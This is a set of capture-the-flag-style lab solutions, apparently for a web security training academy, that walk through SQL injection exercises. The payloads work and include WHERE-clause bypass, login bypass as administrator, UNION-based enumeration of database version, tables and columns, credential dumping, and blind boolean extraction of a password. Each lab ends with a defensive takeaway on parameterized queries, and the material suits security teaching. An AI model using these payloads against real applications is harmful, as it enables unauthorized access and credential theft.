### [PS-SQLi-01] SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**Scenario:** The application's product category filter accepts user input via a URL query parameter and concatenates it directly into the backend database query without parameterization or sanitization. This allows an attacker to alter the query's boolean logic and retrieve records that are normally hidden from public view (such as unreleased products).

**Solution:**

1. Navigate to the shop application and click on any product category filter (e.g., "Gifts").
2. Intercept the resulting HTTP request in Burp Repeater and modify the `category` parameter by appending the SQL injection payload `' OR 1=1--` (URL-encoded as `%27+OR+1%3D1--`).

```http
GET /filter?category=Gifts%27+OR+1%3D1-- HTTP/1.1
Host: target.web-security-academy.net


```

3. Review the request logic. The application intends to run a query similar to `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`. By injecting the payload, the backend query is altered to:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

```

4. Inspect the server's HTML response (or render the page in your browser) to confirm that the `OR 1=1` condition evaluated to true for every row in the database, and the `--` (comment sequence) successfully negated the `AND released = 1` restriction. All products, including hidden ones, are now visible on the page.

> **Key Takeaway:** SQL injection in a `WHERE` clause occurs when untrusted user input alters the intended logical structure of a database query. To prevent this, developers must use parameterized queries (prepared statements) for all database access, ensuring that user input is treated strictly as data rather than executable SQL syntax.

---

### [PS-SQLi-02] SQL injection vulnerability allowing login bypass

**Scenario:** The application's login function constructs a database query by concatenating user-supplied credentials directly into SQL without parameterization. Because the query checks both username and password conditions, altering the query structure allows authentication to succeed as a target account without knowing its password.

**Solution:**

1. Navigate to the login page (`My account`) and submit test credentials while capturing the request in Burp Suite.
2. In Burp Repeater, modify the `username` parameter by closing the string literal and appending a SQL comment sequence (`--`), such as `administrator'--`, with any placeholder value in `password` (URL-encoded in the body as `username=administrator%27--&password=test`).

```http
POST /login HTTP/1.1
Host: target.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN&username=administrator%27--&password=test

```

3. Examine how the backend query changes from checking both fields (`WHERE username = '...' AND password = '...'`) to truncating the remainder of the statement after the comment marker:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'test'

```

4. Send the request and follow or inspect the response to verify that authentication succeeds as the `administrator` account without validating the password.

> **Key Takeaway:** Authentication logic must never rely on string-concatenated SQL queries where user input can terminate string literals or inject comment syntax. Use parameterized queries (prepared statements) and dedicated password-hashing verification (`password_verify` / salted cryptographic hashes) rather than SQL-level credential comparisons.

---

### [PS-SQLi-03] SQL injection attack, querying the database type and version on Oracle

**Scenario:** The application's category filter concatenates user input directly into an Oracle database query and returns the results in the response. By combining a `UNION` query with Oracle's `v$version` view and the `FROM DUAL` requirement for `SELECT` statements, database version details can be retrieved through a string-capable column.

**Solution:**

1. Navigate to the shop application, select a product category filter, and capture the request in Burp Suite.
2. In Burp Repeater, send a `UNION` payload using `NULL` values and `FROM DUAL` to confirm column count and identify a string column (e.g., `' UNION SELECT NULL, 'abc' FROM DUAL--`, URL-encoded as `%27+UNION+SELECT+NULL%2C+%27abc%27+FROM+DUAL--`).
3. Once a text column is confirmed, query Oracle's version information from `v$version` (e.g., `' UNION SELECT NULL, banner FROM v$version--` or `' UNION SELECT banner, NULL FROM v$version--`, URL-encoded as `%27+UNION+SELECT+NULL%2C+banner+FROM+v%24version--`).

```http
GET /filter?category=Gifts%27+UNION+SELECT+NULL%2C+banner+FROM+v%24version-- HTTP/1.1
Host: target.web-security-academy.net



```

4. Examine how the injected `UNION` appends Oracle version rows from `v$version` to the original query results:

```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, banner FROM v$version--'

```

5. Inspect the response body to confirm the Oracle database banner/version string is displayed on the page.

> **Key Takeaway:** Oracle requires a `FROM` clause on every `SELECT` (using `DUAL` for literal expressions) and exposes version metadata via views such as `v$version`. Parameterized queries prevent untrusted input from altering query structure or reading system views.

---

### [PS-SQLi-04] SQL injection attack, querying the database type and version on MySQL and Microsoft

**Scenario:** The application's category filter concatenates user input directly into a database query on MySQL or Microsoft SQL Server and reflects query results in the response. Using a `UNION` query with a text-compatible column and `@@version`, the server version string can be retrieved in the output.

**Solution:**

1. Navigate to the shop application, select a product category filter, and capture the request in Burp Suite.
2. In Burp Repeater, confirm the column count and locate a string-capable column using `UNION SELECT` with `NULL` and a string literal, ending with `-- -` so the space after `--` triggers the comment and the trailing `-` sits safely inside it.
3. Replace the string literal with `@@version` (supported on both MySQL and Microsoft SQL Server) to retrieve database version details through the reflected column:

```http
GET /filter?category=Gifts%27+UNION+SELECT+NULL%2C+%40%40version--+- HTTP/1.1
Host: target.web-security-academy.net



```

4. Observe how the injected `UNION` appends `@@version` to the original query results without leaving an unclosed quote outside the comment:

```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, @@version-- -

```

5. Inspect the response body to confirm the database type and version string appear in the rendered output.

> **Key Takeaway:** MySQL requires whitespace after `--` to treat it as a comment, and trailing `--'` does not close a string literal—it just comments out your own closing quote and breaks the query. Using `-- -` (or `--+` in URL query parameters where `+` decodes to a space) cleanly comments out the remainder of the statement.

---

### [PS-SQLi-05] SQL injection attack, listing the database contents on non-Oracle databases

**Scenario:** The application's category filter concatenates user input directly into a database query on a non-Oracle database (such as PostgreSQL, MySQL, or SQL Server) and reflects query results in the response. Using `UNION` queries against `information_schema` (`tables` and `columns`), you can enumerate table and column names and then extract sensitive data—such as credentials—through a string-capable column.

**Solution:**

1. Navigate to the shop application, select a product category filter, and capture the request in Burp Suite.
2. Confirm the column count and locate a string-capable column (e.g., column 2 in a two-column query), then query `information_schema.tables` to list table names and locate the users table:

```http
GET /filter?category=Gifts%27+UNION+SELECT+NULL%2C+table_name+FROM+information_schema.tables--+- HTTP/1.1
Host: target.web-security-academy.net



```

3. Once you identify the users table (for example, `users_abcdef`), query `information_schema.columns` for that table name to find the username and password column names (such as `username_ghijkl` and `password_mnopqr`):

```http
GET /filter?category=Gifts%27+UNION+SELECT+NULL%2C+column_name+FROM+information_schema.columns+WHERE+table_name%3D%27users_abcdef%27--+- HTTP/1.1
Host: target.web-security-academy.net



```

4. Dump the contents of those columns from the discovered table—combining them into a single string if only one text column is rendered (using `||` in PostgreSQL, `CONCAT` in MySQL, or `+` / `CONCAT` in SQL Server):

```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, username_ghijkl || ':' || password_mnopqr FROM users_abcdef-- -

```

5. Inspect the response body to locate the `administrator` credentials and log in via the application's account page.

> **Key Takeaway:** Non-Oracle databases expose database structure through `information_schema.tables` and `information_schema.columns`, allowing attackers with a reflected `UNION` SQLi to discover dynamic table and column names and read their contents. Parameterized queries prevent untrusted input from altering query structure or accessing schema metadata through injected clauses.

---

### [PS-SQLi-07] SQL injection UNION attack, determining the number of columns returned by the query

**Scenario:** The application's category filter concatenates user input directly into a database query and reflects results in the response. Appending a `UNION SELECT` query requires matching the exact column count of the original `SELECT` statement so the database combines both result sets cleanly.

**Solution:**

1. Navigate to the shop application, select a product category filter, and capture the request in Burp Suite.
2. In Burp Repeater, test column count either by incrementing `ORDER BY` column positions (`' ORDER BY 1--`, `' ORDER BY 2--`, etc.) until an error occurs, or by injecting `UNION SELECT` with `NULL` placeholders until the column count matches (e.g., `' UNION SELECT NULL,NULL,NULL--`, URL-encoded as `%27+UNION+SELECT+NULL%2CNULL%2CNULL--`).

```http
GET /filter?category=Gifts%27+UNION+SELECT+NULL%2CNULL%2CNULL-- HTTP/1.1
Host: target.web-security-academy.net



```

3. Observe how the injected `UNION` appends a second result set with matching column count to the original query:

```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL--'

```

4. Compare responses across column counts to confirm the exact number of columns returned by the query (when `NULL` entries match the column count, the request succeeds without a column-count mismatch error).

> **Key Takeaway:** Combined `UNION` queries must return identical column counts, and `NULL` acts as a type-neutral placeholder while probing column structure. Parameterized queries prevent untrusted input from injecting `UNION` clauses into database statements.

---

### [PS-SQLi-08] SQL injection UNION attack, finding a column containing text

**Scenario:** The application's category filter concatenates user input directly into a database query and reflects query results in the response. After establishing the number of columns returned by the query, you need to identify which column(s) accept string data—and are rendered in the response—so you can extract text values such as a lab-provided string or database contents.

**Solution:**

1. Navigate to the shop application, select a product category filter, and capture the request in Burp Suite.
2. Using the column count already established for the query (e.g., three columns), send `UNION SELECT` payloads that place a test string literal (such as `'abcdef'`) in one column at a time while keeping `NULL` in the others:

```http
GET /filter?category=Gifts%27+UNION+SELECT+NULL%2C%27abcdef%27%2CNULL-- HTTP/1.1
Host: target.web-security-academy.net



```

3. Observe how the injected `UNION` pairs a string literal with `NULL` placeholders across the columns of the original query:

```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,'abcdef',NULL--'

```

4. Cycle the `'abcdef'` literal across each column position (`'abcdef',NULL,NULL`, `NULL,'abcdef',NULL`, `NULL,NULL,'abcdef'`). If a column does not accept strings, the database returns a conversion/type error; once you find a compatible column that is displayed on the page, you can use it to retrieve text (such as the target string required by the lab).

> **Key Takeaway:** Even when a `UNION SELECT` matches the total column count, individual columns enforce data-type compatibility and must be rendered in the output to display extracted strings. Parameterized queries prevent untrusted input from injecting `UNION` clauses into database queries.

---

### [PS-SQLi-09] SQL injection UNION attack, retrieving data from other tables

**Scenario:** The application's category filter concatenates user input directly into a database query and reflects query results in the response. With the column count and a string-compatible column already identified, a `UNION` query can target another table (such as `users`) to retrieve stored values like usernames and passwords through a rendered text column.

**Solution:**

1. Navigate to the shop application, select a product category filter, and capture the request in Burp Suite.
2. Using the established column count and text-capable column position, send a `UNION SELECT` query targeting the `users` table (for example, selecting `username` and `password` across two text columns, or combining them via string concatenation if only one text column is displayed).
3. Review how the injected `UNION` appends rows from the `users` table to the original query results:

```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users-- -

```

4. Inspect the response body to locate the `administrator` credentials and log in via the account page.

> **Key Takeaway:** When user input is concatenated directly into a `SELECT` query with reflected output, `UNION` clauses can read data from unrelated tables within the same database context. Parameterized queries (prepared statements) prevent untrusted input from altering query structure or accessing unauthorized tables.

---

### [PS-SQLi-10] SQL injection UNION attack, retrieving multiple values in a single column

**Scenario:** The application's category filter concatenates user input into a database query and reflects output through a single string-capable result column. Combining multiple fields into one combined string value allows extracting paired data (such as usernames and passwords) when only one text field is rendered per row.

**Solution:**

1. Navigate to the shop application, select a product category filter, and capture the request in Burp Suite.
2. Confirm the column count and identify which single column accepts string data and renders in the response.
3. Send a `UNION SELECT` query targeting the `users` table that concatenates `username` and `password` values with a clear separator (such as `~` or `:`) inside the single text-capable column, adjusting syntax to the underlying SQL dialect.

```http
GET /filter?category=<conceptual_placeholder> HTTP/1.1
Host: target.web-security-academy.net

```

4. Review how the combined string expression returns both attributes within one output slot per row:

```sql
SELECT * FROM products WHERE category = <conceptual_placeholder>

```

5. Inspect the response body to locate the `administrator` credentials and log in via the account page.

> **Key Takeaway:** When only one string-compatible column is displayed, string concatenation operators or functions can pack multiple fields into a single output value. Parameterized queries prevent untrusted input from altering query structure or reading sensitive tables.

---

### [PS-SQLi-11] Blind SQL injection with conditional responses

**Scenario:** The application uses a `TrackingId` cookie inside a database query and reflects a conditional indicator (such as `"Welcome back!"`) in the response when the query returns a row, without leaking database error messages or query output directly. By injecting boolean conditions into the cookie value, you can infer whether the `administrator` user exists, determine the password length, and extract the password character by character.

**Solution:**

1. Browse the target application and capture an HTTP request in Burp Suite that includes the `TrackingId` cookie (for example, `TrackingId=xyz123`).
2. Send the request to Burp Repeater and verify boolean control by appending a true condition (`' AND '1'='1`) versus a false condition (`' AND '1'='2`), observing whether the conditional response indicator (`Welcome back!`) appears or disappears:

```http
GET / HTTP/1.1
Host: target.web-security-academy.net
Cookie: TrackingId=xyz123' AND '1'='1; session=abc123



```

3. Confirm the target account exists in the `users` table using a conditional subquery (`' AND (SELECT 'a' FROM users WHERE username='administrator')='a`), then find the exact length of `administrator`'s password by testing length thresholds (such as `LENGTH(password) > 19` vs. `LENGTH(password) > 20`, or `SUBSTRING(password, 21, 1) > ''`):

```sql
SELECT tracking-id FROM TrackedUsers WHERE tracking-id = 'xyz123' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > 19)='a'

```

4. Extract each character position (`1` through the confirmed password length) using `SUBSTRING(password, <pos>, 1) = '<char>'` (or `SUBSTR` in Oracle) with Burp Intruder or an automated loop over alphanumeric characters (`a-z`, `0-9`, etc.), then log in as `administrator` with the reconstructed password.

> **Key Takeaway:** Even when an application does not display query results or database errors directly, observable differences in application responses to true vs. false SQL conditions enable blind data extraction. Parameterized queries prevent untrusted cookie values from altering `WHERE` clause logic or executing injected subqueries.

---

